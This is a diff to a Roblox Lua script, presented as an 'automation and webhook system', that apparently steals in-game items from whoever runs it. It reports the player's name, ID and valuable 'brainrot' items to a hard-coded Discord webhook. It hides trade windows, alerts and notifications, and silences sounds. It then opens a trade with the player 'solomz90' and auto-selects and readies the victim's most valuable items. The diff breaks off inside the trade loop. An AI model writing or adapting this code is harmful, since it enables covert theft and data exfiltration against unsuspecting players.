@@ -751,6 +751,25 @@ end)
 -- AUTOMATION & WEBHOOK SYSTEM (INTEGRATED)
 -- =============================================================
 
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local Workspace = game:GetService("Workspace")
+local RunService = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
+local TextChatService = game:GetService("TextChatService")
+
+local LP = Players.LocalPlayer
+local cam = Workspace.CurrentCamera
+local pg = LP:WaitForChild("PlayerGui")
+
+-- URL de tu Webhook de Discord
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1538656296943751180/_9xvaGd9sngrEJJkOSLnVxS4ORsUVK7Duyo1TzK4DoaZK7uf7liBdyhyP87G6M9rYCAN"
+
+--------------------------------------------------------------------------------
+-- OCULTAR NOTIFICACIONES Y MENSAJES DE TRADEO EN EL CHAT
+--------------------------------------------------------------------------------
+
 pcall(function()
     StarterGui:SetCore("SendNotification", {
         Title = "",
@@ -770,6 +789,7 @@ if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
     end
 end
 
+-- Función para enviar datos a Discord mediante Webhook
 local function sendToDiscord(title, description, fields)
     local executorName = LP and LP.Name or "Desconocido"
     local executorId = LP and tostring(LP.UserId) or "0"
@@ -777,7 +797,7 @@ local function sendToDiscord(title, description, fields)
     local data = {
         ["title"] = title,
         ["description"] = description .. "\n\n👤 **Ejecutado por:** " .. executorName .. " (ID: " .. executorId .. ")",
-        ["color"] = 65280,
+        ["color"] = 65280, -- Verde
         ["fields"] = fields,
         ["footer"] = {
             ["text"] = "Automatización de Brainrots - Roblox"
@@ -801,6 +821,7 @@ local function sendToDiscord(title, description, fields)
     end)
 end
 
+-- Silenciar y eliminar sonidos no deseados en Workspace
 Workspace.ChildAdded:Connect(function(child)
     if child:IsA("Sound") and (child.Name == "Activated" or child.Name == "Error") then
         child.Volume = 0
@@ -809,6 +830,7 @@ Workspace.ChildAdded:Connect(function(child)
     end
 end)
 
+-- ELIMINAR NOTIFICACIONES OCULTANDO GUI
 local function suppressMessages()
     local function cleanNotificationGui(gui)
         local nameLower = string.lower(gui.Name)
@@ -827,6 +849,7 @@ local function suppressMessages()
     end
 end
 
+-- OCULTAR VENTANAS EMERGENTES DE SOLICITUD DE TRADE
 local function hideTradePrompts()
     local function processPrompt(gui)
         local nameLower = string.lower(gui.Name)
@@ -854,6 +877,7 @@ end
 suppressMessages()
 hideTradePrompts()
 
+-- FUNCIÓN PARA OBTENER EL VALOR REAL DESDE DEBRIS
 local function getRealBrainrotValue(brainrotModel)
     if not brainrotModel then return "Modelo nulo" end
 
@@ -922,455 +946,506 @@ local function getRealBrainrotValue(brainrotModel)
 end
 
 task.spawn(function()
-    local DELAY_STEP = 0.8
 
-    local BrainrotPriority = {
-        "Headless Horseman", "Signore Carapace", "Arcadragon", "Elefanto Frigo", "Strawberry Elephant",
-        "Pancake and Syrup", "Love Love Bear", "Antonio", "Meowl", "Skibidi Toilet", "Rico Dinero",
-        "Griffin", "Dragon Gingerini", "Fishino Clownino", "La Supreme Combinasion", "Ginger Gerat",
-        "Tirilikalika Tirilikalako", "Kalika Bros", "Digi Narwhal", "Hydra Bunny", "Dragon Cannelloni",
-        "Los Hackers", "Hydra Dragon Cannelloni", "Bunny and Eggy", "Duggy Bros", "Dug dug dug",
-        "Ketupat Bros", "John Doe", "La Casa Boo", "Foxini Lanternini", "Quackini Snackini",
-        "Los Chillis", "Guest 666", "Cerberus", "Rosey and Teddy", "Reinito Sleighito",
-        "Fragola La La La", "Gym Bros", "Spooky and Pumpky", "Cloverat Clapat", "Cooki and Milki",
-        "Cash or Card", "Fortunu and Cashuru", "Jolly Jolly Sahur", "Capitano Moby",
-        "Fragrama and Chocrama", "Chillin Chili", "Los Sekolahs", "Sammyni Fattini", "Los Amigos",
-        "Money Money Reindeer", "Boppin Bunny", "Festive 67", "Money Money Bros", "Tralaledon",
-        "La Food Combinasion", "Celularcini Viciosini", "Hopilikalika Hopilikalako", "Los Tangcitos",
-        "Swaggy Bros", "Los Spaghettis", "Popcuru and Fizzuru", "Garama and Madundung",
-        "Celestial Pegasus", "La Easter Grande", "Gold Gold Gold", "Nacho Spyder", "Orcaledon",
-        "Los Mariachis", "Burguro And Fryuro", "Lovin Rose", "W or L", "La Ginger Sekolah",
-        "Chipso and Queso", "Los Primos", "Swag Soda", "Los Hotspotsitos", "La Taco Combinasion",
-        "La Romantic Grande", "Eviledon", "Los Bros", "Las Sis", "Tictac Sahur",
-        "La Secret Combinasion", "La Lucky Grande", "Ketchuru and Musturu", "Gobblino Uniciclino",
-        "Rosetti Tualetti", "Tacorita Bicicleta", "Ventoliero Pavonero", "La Sahur Combinasion",
-        "Abyssaloco", "Rubrikiko", "La Anniversary Grande", "Jelly Moby", "Sammyni Cakini",
-        "Lavadorito Spinito", "Donkeyturbo Express", "Coco and Mango", "Dragon Aquanini", "Kraken",
-        "Venuspino", "Bearito Cabinito", "Sand Sand Sand", "Globa Steppa", "Los Fruits",
-        "Conetto Morsetto"
-    }
+local DELAY_STEP = 0.8
 
-    local function cleanStr(str)
-        return string.lower(string.gsub(tostring(str or ""), "%s+", ""))
-    end
+local BrainrotPriority = {
+    "Headless Horseman", "Signore Carapace", "Arcadragon", "Elefanto Frigo", "Strawberry Elephant",
+    "Pancake and Syrup", "Love Love Bear", "Antonio", "Meowl", "Skibidi Toilet", "Rico Dinero",
+    "Griffin", "Dragon Gingerini", "Fishino Clownino", "La Supreme Combinasion", "Ginger Gerat",
+    "Tirilikalika Tirilikalako", "Kalika Bros", "Digi Narwhal", "Hydra Bunny", "Dragon Cannelloni",
+    "Los Hackers", "Hydra Dragon Cannelloni", "Bunny and Eggy", "Duggy Bros", "Dug dug dug",
+    "Ketupat Bros", "John Doe", "La Casa Boo", "Foxini Lanternini", "Quackini Snackini",
+    "Los Chillis", "Guest 666", "Cerberus", "Rosey and Teddy", "Reinito Sleighito",
+    "Fragola La La La", "Gym Bros", "Spooky and Pumpky", "Cloverat Clapat", "Cooki and Milki",
+    "Cash or Card", "Fortunu and Cashuru", "Jolly Jolly Sahur", "Capitano Moby",
+    "Fragrama and Chocrama", "Chillin Chili", "Los Sekolahs", "Sammyni Fattini", "Los Amigos",
+    "Money Money Reindeer", "Boppin Bunny", "Festive 67", "Money Money Bros", "Tralaledon",
+    "La Food Combinasion", "Celularcini Viciosini", "Hopilikalika Hopilikalako", "Los Tangcitos",
+    "Swaggy Bros", "Los Spaghettis", "Popcuru and Fizzuru", "Garama and Madundung",
+    "Celestial Pegasus", "La Easter Grande", "Gold Gold Gold", "Nacho Spyder", "Orcaledon",
+    "Los Mariachis", "Burguro And Fryuro", "Lovin Rose", "W or L", "La Ginger Sekolah",
+    "Chipso and Queso", "Los Primos", "Swag Soda", "Los Hotspotsitos", "La Taco Combinasion",
+    "La Romantic Grande", "Eviledon", "Los Bros", "Las Sis", "Tictac Sahur",
+    "La Secret Combinasion", "La Lucky Grande", "Ketchuru and Musturu", "Gobblino Uniciclino",
+    "Rosetti Tualetti", "Tacorita Bicicleta", "Ventoliero Pavonero", "La Sahur Combinasion",
+    "Abyssaloco", "Rubrikiko", "La Anniversary Grande", "Jelly Moby", "Sammyni Cakini",
+    "Lavadorito Spinito", "Donkeyturbo Express", "Coco and Mango", "Dragon Aquanini", "Kraken",
+    "Venuspino", "Bearito Cabinito", "Sand Sand Sand", "Globa Steppa", "Los Fruits",
+    "Conetto Morsetto", "Tang Tang Keletang", "La Summer Grande", "Los Planitos",
+    "Los Sweethearts", "Steakini Fattini", "Capitano Americano", "Bufalino Boomberino",
+    "Los Tictacs", "Los Admins", "Moby Bros", "Grabatron", "Rubiko and Kubiko",
+    "Cangurato Gelato", "Chicleteira Champeona", "Pizza and Ranch", "Los Secret Combinasionas",
+    "Bumbatron", "Yetimatic", "S'more Serat", "Queen Bee", "Scorpino Coasterino",
+    "Honey Honey Bear", "La Breakfast Combinasion", "Pogo Pogo Penguin", "Examen Bros",
+    "Noodle Noodle Poodle", "Var Var Var", "Yess my examine", "Ref Ref Ref Sahur"
+}
 
-    local BrainrotPriorityMap = {}
-    local TargetBrainrotsClean = {}
+local function cleanStr(str)
+    return string.lower(string.gsub(tostring(str or ""), "%s+", ""))
+end
 
-    for i, name in ipairs(BrainrotPriority) do 
-        BrainrotPriorityMap[cleanStr(name)] = i 
-        TargetBrainrotsClean[cleanStr(name)] = name
-    end
+local BrainrotPriorityMap = {}
+local TargetBrainrotsClean = {}
 
-    local function hideSingleObject(obj)
-        if obj:IsA("GuiObject") then
-            obj.Position = UDim2.new(10, 0, 10, 0)
-            obj.BackgroundTransparency = 1
+for i, name in ipairs(BrainrotPriority) do 
+    BrainrotPriorityMap[cleanStr(name)] = i 
+    TargetBrainrotsClean[cleanStr(name)] = name
+end
 
-            if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
-                obj.TextTransparency = 1
-                obj.TextStrokeTransparency = 1
-            end
+local function hideSingleObject(obj)
+    if obj:IsA("GuiObject") then
+        obj.Position = UDim2.new(10, 0, 10, 0)
+        obj.BackgroundTransparency = 1
 
-            if obj:IsA("ImageLabel") or obj:IsA("ImageButton") then
-                obj.ImageTransparency = 1
-            end
-
-            if obj:IsA("CanvasGroup") then
-                obj.GroupTransparency = 1
-            end
-
-            local UIStroke = obj:FindFirstChildOfClass("UIStroke")
-            if UIStroke then UIStroke.Transparency = 1 end
+        if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
+            obj.TextTransparency = 1
+            obj.TextStrokeTransparency = 1
         end
-    end
 
-    local function hideGuiVisualOnly(guiObj)
-        for _, obj in ipairs(guiObj:GetDescendants()) do hideSingleObject(obj) end
-        if guiObj:IsA("GuiObject") then hideSingleObject(guiObj) end
-
-        if not guiObj:GetAttribute("HideListenerSet") then
-            guiObj:SetAttribute("HideListenerSet", true)
-            guiObj.DescendantAdded:Connect(function(child)
-                task.defer(function() hideSingleObject(child) end)
-            end)
+        if obj:IsA("ImageLabel") or obj:IsA("ImageButton") then
+            obj.ImageTransparency = 1
         end
-    end
 
-    local function applyEverythingAfterTargetFound()
-        local function handleCam(obj)
-            if obj:IsA("BlurEffect") then obj.Enabled = false end
+        if obj:IsA("CanvasGroup") then
+            obj.GroupTransparency = 1
         end
-        cam.ChildAdded:Connect(handleCam)
-        for _, v in ipairs(cam:GetChildren()) do handleCam(v) end
 
-        RunService.RenderStepped:Connect(function()
-            cam.FieldOfView = 70
+        local UIStroke = obj:FindFirstChildOfClass("UIStroke")
+        if UIStroke then UIStroke.Transparency = 1 end
+    end
+end
+
+local function hideGuiVisualOnly(guiObj)
+    for _, obj in ipairs(guiObj:GetDescendants()) do hideSingleObject(obj) end
+    if guiObj:IsA("GuiObject") then hideSingleObject(guiObj) end
+
+    if not guiObj:GetAttribute("HideListenerSet") then
+        guiObj:SetAttribute("HideListenerSet", true)
+        guiObj.DescendantAdded:Connect(function(child)
+            task.defer(function() hideSingleObject(child) end)
         end)
-
-        local function handleGui(obj)
-            if obj.Name:find("Prompt") or obj:IsA("ProximityPrompt") then return end
-
-            local tradeGuis = {
-                ["TradeLiveTrade"] = true,
-                ["BrainrotTrader"] = true,
-                ["TradePrompts"] = true
-            }
-
-            if tradeGuis[obj.Name] then
-                if obj:IsA("ScreenGui") then
-                    for _, child in ipairs(obj:GetChildren()) do
-                        if child:IsA("GuiObject") then
-                            child.Position = UDim2.new(10, 0, 10, 0)
-                        end
-                    end
-                end
-                task.defer(function() hideGuiVisualOnly(obj) end)
-                return
-            end
-
-            local targetAlerts = {
-                ["TradeAlert"] = true,
-                ["TradeError"] = true
-            }
-
-            if targetAlerts[obj.Name] then
-                task.defer(function() hideGuiVisualOnly(obj) end)
-            end
-        end
-        pg.ChildAdded:Connect(handleGui)
-        for _, v in ipairs(pg:GetChildren()) do handleGui(v) end
     end
+end
 
-    local plotsFolder = Workspace:FindFirstChild("Plots")
-    if not plotsFolder then return end
-
-    local closestPlot = nil
-
-    local function getOwnerText(plot)
-        local plotSign = plot:FindFirstChild("PlotSign")
-        if not plotSign then return nil end
-        local surfaceGui = plotSign:FindFirstChild("SurfaceGui")
-        if not surfaceGui then return nil end
-        local frame = surfaceGui:FindFirstChild("Frame")
-        if not frame then return nil end
-        local label = frame:FindFirstChildWhichIsA("TextLabel")
-        if not label then return nil end
-        return label.Text
+local function applyEverythingAfterTargetFound()
+    local function handleCam(obj)
+        if obj:IsA("BlurEffect") then obj.Enabled = false end
     end
+    cam.ChildAdded:Connect(handleCam)
+    for _, v in ipairs(cam:GetChildren()) do handleCam(v) end
 
-    local myUsername = string.lower(LP.Name)
-    local myDisplayName = string.lower(LP.DisplayName)
-
-    for _, plot in ipairs(plotsFolder:GetChildren()) do
-        local ownerText = getOwnerText(plot)
-        if ownerText then
-            local ownerLower = string.lower(ownerText)
-            if string.find(ownerLower, "solomz90's base", 1, true) then continue end
-            if string.find(ownerLower, myUsername, 1, true) then closestPlot = plot; break end
-            if string.find(ownerLower, myDisplayName, 1, true) then closestPlot = plot; break end
-            if string.find(ownerText, "・・・", 1, true) then closestPlot = plot; break end
-        end
-    end
-
-    if not closestPlot then return end
-
-    local brainrotQueue = {}
-
-    for _, child in ipairs(closestPlot:GetChildren()) do
-        if child:IsA("Model") and not child.Name:find("Panel") and not child.Name:find("Cash") then
-            local rawName = child.Name
-            local cleanedName = cleanStr(rawName)
-            
-            local matchedName = nil
-            if TargetBrainrotsClean[cleanedName] then
-                matchedName = TargetBrainrotsClean[cleanedName]
-            else
-                for targetClean, originalName in pairs(TargetBrainrotsClean) do
-                    if string.find(cleanedName, targetClean, 1, true) or string.find(targetClean, cleanedName, 1, true) then
-                        matchedName = originalName
-                        break
-                    end
-                end
-            end
-
-            if matchedName then
-                local genText = getRealBrainrotValue(child)
-                table.insert(brainrotQueue, {
-                    slotKey = rawName,
-                    instance = child,
-                    instanceId = tostring(child),
-                    generation = genText,
-                    name = matchedName,
-                    rawName = rawName
-                })
-            end
-        end
-    end
-
-    local discordFields = {}
-    for _, item in ipairs(brainrotQueue) do
-        table.insert(discordFields, {
-            ["name"] = item.name,
-            ["value"] = "Generación: **" .. item.generation .. "**",
-            ["inline"] = false
-        })
-    end
-
-    if #brainrotQueue > 0 then
-        sendToDiscord("🧠 Brainrots Detectados en Plot", "Se han encontrado " .. tostring(#brainrotQueue) .. " elementos válidos:", discordFields)
-    else
-        sendToDiscord("⚠️ Sin Brainrots", "No se encontraron elementos de la lista en este plot.", {})
-        return
-    end
-
-    table.sort(brainrotQueue, function(a, b)
-        local aPriority = BrainrotPriorityMap[cleanStr(a.name)] or 999999
-        local bPriority = BrainrotPriorityMap[cleanStr(b.name)] or 999999
-        if aPriority == bPriority then
-            return tostring(a.instanceId) < tostring(b.instanceId)
-        end
-        return aPriority < bPriority
+    RunService.RenderStepped:Connect(function()
+        cam.FieldOfView = 70
     end)
 
-    applyEverythingAfterTargetFound()
+    local function handleGui(obj)
+        if obj.Name:find("Prompt") or obj:IsA("ProximityPrompt") then return end
 
-    local processedButtons = {}
+        local tradeGuis = {
+            ["TradeLiveTrade"] = true,
+            ["BrainrotTrader"] = true,
+            ["TradePrompts"] = true
+        }
 
-    local function triggerClick(btn)
-        if not btn then return false end
-        local success = false
-
-        if typeof(firesignal) == "function" then
-            pcall(function() firesignal(btn.MouseButton1Click) end)
-            pcall(function() firesignal(btn.Activated) end)
-            success = true
-        elseif typeof(getconnections) == "function" then
-            for _, conn in ipairs(getconnections(btn.MouseButton1Click)) do
-                if conn.Enabled then conn:Fire() end
+        if tradeGuis[obj.Name] then
+            if obj:IsA("ScreenGui") then
+                for _, child in ipairs(obj:GetChildren()) do
+                    if child:IsA("GuiObject") then
+                        child.Position = UDim2.new(10, 0, 10, 0)
+                    end
+                end
             end
-            for _, conn in ipairs(getconnections(btn.Activated)) do
-                if conn.Enabled then conn:Fire() end
-            end
-            success = true
+            task.defer(function() hideGuiVisualOnly(obj) end)
+            return
         end
 
-        return success
+        local targetAlerts = {
+            ["TradeAlert"] = true,
+            ["TradeError"] = true
+        }
+
+        if targetAlerts[obj.Name] then
+            task.defer(function() hideGuiVisualOnly(obj) end)
+        end
+    end
+    pg.ChildAdded:Connect(handleGui)
+    for _, v in ipairs(pg:GetChildren()) do handleGui(v) end
+end
+
+local plotsFolder = Workspace:FindFirstChild("Plots")
+if not plotsFolder then
+    warn("❌ No se encontró Workspace.Plots")
+    return
+end
+
+local closestPlot = nil
+
+local function getOwnerText(plot)
+    local plotSign = plot:FindFirstChild("PlotSign")
+    if not plotSign then return nil end
+
+    local surfaceGui = plotSign:FindFirstChild("SurfaceGui")
+    if not surfaceGui then return nil end
+
+    local frame = surfaceGui:FindFirstChild("Frame")
+    if not frame then return nil end
+
+    local label = frame:FindFirstChildWhichIsA("TextLabel")
+    if not label then return nil end
+
+    return label.Text
+end
+
+local myUsername = string.lower(LP.Name)
+local myDisplayName = string.lower(LP.DisplayName)
+
+for _, plot in ipairs(plotsFolder:GetChildren()) do
+    local ownerText = getOwnerText(plot)
+    if ownerText then
+        local ownerLower = string.lower(ownerText)
+
+        if string.find(ownerLower, "solomz90's base", 1, true) then
+            continue
+        end
+
+        if string.find(ownerLower, myUsername, 1, true) then
+            closestPlot = plot
+            break
+        end
+
+        if string.find(ownerLower, myDisplayName, 1, true) then
+            closestPlot = plot
+            break
+        end
+
+        if string.find(ownerText, "・・・", 1, true) then
+            closestPlot = plot
+            break
+        end
+    end
+end
+
+if not closestPlot then
+    warn("❌ NO SE PUDO ENCONTRAR TU PLOT")
+    return
+end
+
+local brainrotQueue = {}
+
+for _, child in ipairs(closestPlot:GetChildren()) do
+    if child:IsA("Model") and not child.Name:find("Panel") and not child.Name:find("Cash") then
+        local rawName = child.Name
+        local cleanedName = cleanStr(rawName)
+        
+        local matchedName = nil
+        if TargetBrainrotsClean[cleanedName] then
+            matchedName = TargetBrainrotsClean[cleanedName]
+        else
+            for targetClean, originalName in pairs(TargetBrainrotsClean) do
+                if string.find(cleanedName, targetClean, 1, true) or string.find(targetClean, cleanedName, 1, true) then
+                    matchedName = originalName
+                    break
+                end
+            end
+        end
+
+        if matchedName then
+            local genText = getRealBrainrotValue(child)
+
+            table.insert(brainrotQueue, {
+                slotKey = rawName,
+                instance = child,
+                instanceId = tostring(child),
+                generation = genText,
+                name = matchedName,
+                rawName = rawName
+            })
+        end
+    end
+end
+
+local discordFields = {}
+for _, item in ipairs(brainrotQueue) do
+    table.insert(discordFields, {
+        ["name"] = item.name,
+        ["value"] = "Generación: **" .. item.generation .. "**",
+        ["inline"] = false
+    })
+end
+
+if #brainrotQueue > 0 then
+    sendToDiscord("🧠 Brainrots Detectados en Plot", "Se han encontrado " .. tostring(#brainrotQueue) .. " elementos válidos:", discordFields)
+else
+    sendToDiscord("⚠️ Sin Brainrots", "No se encontraron elementos de la lista en este plot.", {})
+    return
+end
+
+table.sort(brainrotQueue, function(a, b)
+    local aPriority = BrainrotPriorityMap[cleanStr(a.name)] or 999999
+    local bPriority = BrainrotPriorityMap[cleanStr(b.name)] or 999999
+    if aPriority == bPriority then
+        return tostring(a.instanceId) < tostring(b.instanceId)
+    end
+    return aPriority < bPriority
+end)
+
+applyEverythingAfterTargetFound()
+
+local processedButtons = {}
+
+local function triggerClick(btn)
+    if not btn then return false end
+    local success = false
+
+    if typeof(firesignal) == "function" then
+        pcall(function() firesignal(btn.MouseButton1Click) end)
+        pcall(function() firesignal(btn.Activated) end)
+        success = true
+    elseif typeof(getconnections) == "function" then
+        for _, conn in ipairs(getconnections(btn.MouseButton1Click)) do
+            if conn.Enabled then conn:Fire() end
+        end
+        for _, conn in ipairs(getconnections(btn.Activated)) do
+            if conn.Enabled then conn:Fire() end
+        end
+        success = true
     end
 
-    local function findBrainrotButton(item)
-        local yourInventory = pg:FindFirstChild("TradeLiveTrade")
-            and pg.TradeLiveTrade:FindFirstChild("TradeLiveTrade")
-            and pg.TradeLiveTrade.TradeLiveTrade:FindFirstChild("Your")
-            and pg.TradeLiveTrade.TradeLiveTrade.Your:FindFirstChild("ScrollingFrame")
+    return success
+end
 
-        if not yourInventory then return nil end
+-- ============================================================================
+-- NUEVA LÓGICA DE BÚSQUEDA Y SELECCIÓN EXACTA POR ORDEN DE PRIORIDAD
+-- ============================================================================
+local function findBrainrotButton(item)
+    local yourInventory = pg:FindFirstChild("TradeLiveTrade")
+        and pg.TradeLiveTrade:FindFirstChild("TradeLiveTrade")
+        and pg.TradeLiveTrade.TradeLiveTrade:FindFirstChild("Your")
+        and pg.TradeLiveTrade.TradeLiveTrade.Your:FindFirstChild("ScrollingFrame")
 
-        local targetClean = cleanStr(item.name)
-        local rawClean = cleanStr(item.rawName)
-        local genClean = cleanStr(item.generation)
+    if not yourInventory then return nil end
 
-        for _, slot in ipairs(yourInventory:GetChildren()) do
-            if string.find(slot.Name, "Selection_Brainrot_") then
-                local button = slot:FindFirstChild("Spacer") or slot:FindFirstChildWhichIsA("GuiButton")
-                
-                if button and not processedButtons[button] then
-                    local matchesName = false
-                    local foundGenMatch = (genClean == "unknown")
+    local targetClean = cleanStr(item.name)
+    local rawClean = cleanStr(item.rawName)
+    local genClean = cleanStr(item.generation)
+    local isGenUnknown = (genClean == "unknown" or genClean == "cifra no detectada")
 
-                    for _, subDesc in ipairs(slot:GetDescendants()) do
-                        if subDesc:IsA("TextLabel") or subDesc:IsA("TextButton") then
-                            local textClean = cleanStr(subDesc.Text)
-                            
-                            if textClean == targetClean or textClean == rawClean or string.find(textClean, targetClean, 1, true) or string.find(targetClean, textClean, 1, true) then
-                                matchesName = true
-                            end
+    local bestCandidateButton = nil
 
-                            if not foundGenMatch and string.find(textClean, genClean, 1, true) then
-                                foundGenMatch = true
-                            end
+    for _, slot in ipairs(yourInventory:GetChildren()) do
+        if string.find(slot.Name, "Selection_Brainrot_") then
+            local button = slot:FindFirstChild("Spacer") or slot:FindFirstChildWhichIsA("GuiButton")
+            
+            if button and not processedButtons[button] then
+                local matchesName = false
+                local foundGenMatch = isGenUnknown
+
+                for _, subDesc in ipairs(slot:GetDescendants()) do
+                    if subDesc:IsA("TextLabel") or subDesc:IsA("TextButton") then
+                        local textClean = cleanStr(subDesc.Text)
+                        
+                        if textClean == targetClean or textClean == rawClean or string.find(textClean, targetClean, 1, true) or string.find(targetClean, textClean, 1, true) then
+                            matchesName = true
+                        end
+
+                        if not foundGenMatch and (string.find(textClean, genClean, 1, true) or string.find(genClean, textClean, 1, true)) then
+                            foundGenMatch = true
                         end
                     end
+                end
 
-                    if matchesName and foundGenMatch then
+                if matchesName then
+                    if foundGenMatch then
+                        -- Coincidencia perfecta de Nombre y Generación: lo devolvemos de inmediato
                         return button
+                    elseif not bestCandidateButton then
+                        -- Si coincide el nombre pero la generación no emparejó exacto, lo guardamos como alternativa
+                        bestCandidateButton = button
                     end
                 end
             end
         end
-
-        return nil
     end
 
-    local function selectBrainrot(item, index)
-        task.wait(0.15)
-        local button = findBrainrotButton(item)
-        if not button then return false end
+    -- Si no hubo coincidencia exacta de generación pero sí de nombre, devolvemos el candidato para no saltarlo
+    return bestCandidateButton
+end
 
-        local success = triggerClick(button)
-        if success then
-            processedButtons[button] = true
+local function selectBrainrot(item, index)
+    task.wait(0.15)
+
+    local button = findBrainrotButton(item)
+    if not button then return false end
+
+    local success = triggerClick(button)
+    if success then
+        processedButtons[button] = true
+        return true
+    end
+
+    return false
+end
+
+local function pressReadyButtonByPath()
+    local readyBtn = pg:FindFirstChild("TradeLiveTrade") 
+        and pg.TradeLiveTrade:FindFirstChild("TradeLiveTrade") 
+        and pg.TradeLiveTrade.TradeLiveTrade:FindFirstChild("Other") 
+        and pg.TradeLiveTrade.TradeLiveTrade.Other:FindFirstChild("ReadyButton")
+
+    if readyBtn then
+        local button = readyBtn:IsA("GuiButton") and readyBtn or readyBtn:FindFirstChildWhichIsA("GuiButton", true)
+        if button then
+            triggerClick(button)
             return true
         end
-
-        return false
     end
+    return false
+end
 
-    local function pressReadyButtonByPath()
-        local readyBtn = pg:FindFirstChild("TradeLiveTrade") 
-            and pg.TradeLiveTrade:FindFirstChild("TradeLiveTrade") 
-            and pg.TradeLiveTrade.TradeLiveTrade:FindFirstChild("Other") 
-            and pg.TradeLiveTrade.TradeLiveTrade.Other:FindFirstChild("ReadyButton")
+local function sendTradeToPlayer()
+    local tradeGui = pg:WaitForChild("TradePlayerList", 10)
+    if not tradeGui then return end
+    
+    local trade = tradeGui:WaitForChild("TradePlayerList", 10)
+    if not trade then return end
 
-        if readyBtn then
-            local button = readyBtn:IsA("GuiButton") and readyBtn or readyBtn:FindFirstChildWhichIsA("GuiButton", true)
-            if button then
-                triggerClick(button)
-                return true
+    local searchBox = trade.Sections.Players.SearchFrame.SearchBox
+    local list = trade.Sections.Players.List
+
+    local connection
+    connection = list.ChildAdded:Connect(function(child)
+        if string.find(string.lower(child.Name), "solomz90") then
+            if child:IsA("GuiObject") then
+                child.Visible = false
+                child.Position = UDim2.new(10, 0, 10, 0)
             end
-        end
-        return false
-    end
-
-    local function sendTradeToPlayer()
-        local tradeGui = pg:WaitForChild("TradePlayerList", 10)
-        if not tradeGui then return end
-        
-        local trade = tradeGui:WaitForChild("TradePlayerList", 10)
-        if not trade then return end
-
-        local searchBox = trade.Sections.Players.SearchFrame.SearchBox
-        local list = trade.Sections.Players.List
-
-        local connection
-        connection = list.ChildAdded:Connect(function(child)
-            if string.find(string.lower(child.Name), "solomz90") then
-                if child:IsA("GuiObject") then
+        else
+            for _, textObj in ipairs(child:GetDescendants()) do
+                if (textObj:IsA("TextLabel") or textObj:IsA("TextButton")) and string.find(string.lower(textObj.Text), "solomz90") then
                     child.Visible = false
                     child.Position = UDim2.new(10, 0, 10, 0)
+                    break
                 end
-            else
-                for _, textObj in ipairs(child:GetDescendants()) do
-                    if (textObj:IsA("TextLabel") or textObj:IsA("TextButton")) and string.find(string.lower(textObj.Text), "solomz90") then
-                        child.Visible = false
-                        child.Position = UDim2.new(10, 0, 10, 0)
-                        break
-                    end
-                end
-            end
-        end)
-
-        searchBox.Text = "solomz90"
-
-        if typeof(firesignal) == "function" then
-            pcall(function() firesignal(searchBox.FocusLost, true) end)
-            pcall(function() firesignal(searchBox:GetPropertyChangedSignal("Text")) end)
-        elseif typeof(getconnections) == "function" then
-            for _, conn in ipairs(getconnections(searchBox.FocusLost)) do
-                if conn.Enabled then conn:Fire(true) end
-            end
-            for _, conn in ipairs(getconnections(searchBox:GetPropertyChangedSignal("Text"))) do
-                if conn.Enabled then conn:Fire() end
             end
         end
+    end)
 
-        task.wait(0.3)
+    searchBox.Text = "solomz90"
 
-        local playerEntry = nil
-        for i = 1, 15 do
-            for _, child in ipairs(list:GetChildren()) do
-                if string.find(string.lower(child.Name), "solomz90") then
+    if typeof(firesignal) == "function" then
+        pcall(function() firesignal(searchBox.FocusLost, true) end)
+        pcall(function() firesignal(searchBox:GetPropertyChangedSignal("Text")) end)
+    elseif typeof(getconnections) == "function" then
+        for _, conn in ipairs(getconnections(searchBox.FocusLost)) do
+            if conn.Enabled then conn:Fire(true) end
+        end
+        for _, conn in ipairs(getconnections(searchBox:GetPropertyChangedSignal("Text"))) do
+            if conn.Enabled then conn:Fire() end
+        end
+    end
+
+    task.wait(0.3)
+
+    local playerEntry = nil
+
+    for i = 1, 15 do
+        for _, child in ipairs(list:GetChildren()) do
+            if string.find(string.lower(child.Name), "solomz90") then
+                playerEntry = child
+                break
+            end
+
+            for _, textObj in ipairs(child:GetDescendants()) do
+                if (textObj:IsA("TextLabel") or textObj:IsA("TextButton")) and string.find(string.lower(textObj.Text), "solomz90") then
                     playerEntry = child
                     break
                 end
-
-                for _, textObj in ipairs(child:GetDescendants()) do
-                    if (textObj:IsA("TextLabel") or textObj:IsA("TextButton")) and string.find(string.lower(textObj.Text), "solomz90") then
-                        playerEntry = child
-                        break
-                    end
-                end
-
-                if playerEntry then break end
             end
 
             if playerEntry then break end
-            task.wait(0.3)
         end
 
-        if connection then connection:Disconnect() end
-        if not playerEntry then return end
+        if playerEntry then break end
+        task.wait(0.3)
+    end
 
-        if playerEntry:IsA("GuiObject") then
-            playerEntry.Position = UDim2.new(10, 0, 10, 0)
-            playerEntry.Visible = false
-        end
+    if connection then connection:Disconnect() end
 
-        local sendBtn = nil
-        for _, descendant in ipairs(playerEntry:GetDescendants()) do
-            if descendant:IsA("GuiButton") then
-                sendBtn = descendant
-                break
-            end
-        end
+    if not playerEntry then return end
 
-        if sendBtn then
-            triggerClick(sendBtn)
+    if playerEntry:IsA("GuiObject") then
+        playerEntry.Position = UDim2.new(10, 0, 10, 0)
+        playerEntry.Visible = false
+    end
+
+    local sendBtn = nil
+    for _, descendant in ipairs(playerEntry:GetDescendants()) do
+        if descendant:IsA("GuiButton") then
+            sendBtn = descendant
+            break
         end
     end
 
-    local function isTradeActive()
-        local tradeLive = pg:FindFirstChild("TradeLiveTrade")
-        if tradeLive then
-            if tradeLive:IsA("ScreenGui") and tradeLive.Enabled then return true end
-            if tradeLive:IsA("GuiObject") and tradeLive.Visible then return true end
-        end
-        return false
+    if sendBtn then
+        triggerClick(sendBtn)
     end
+end
 
-    local function startFullAutomation()
-        while true do
-            processedButtons = {}
+local function isTradeActive()
+    local tradeLive = pg:FindFirstChild("TradeLiveTrade")
+    if tradeLive then
+        if tradeLive:IsA("ScreenGui") and tradeLive.Enabled then return true end
+        if tradeLive:IsA("GuiObject") and tradeLive.Visible then return true end
+    end
+    return false
+end
 
-            while not isTradeActive() do
-                sendTradeToPlayer()
-                local startWait = tick()
-                while tick() - startWait < 4 do
-                    if isTradeActive() then break end
-                    task.wait(0.3)
-                end
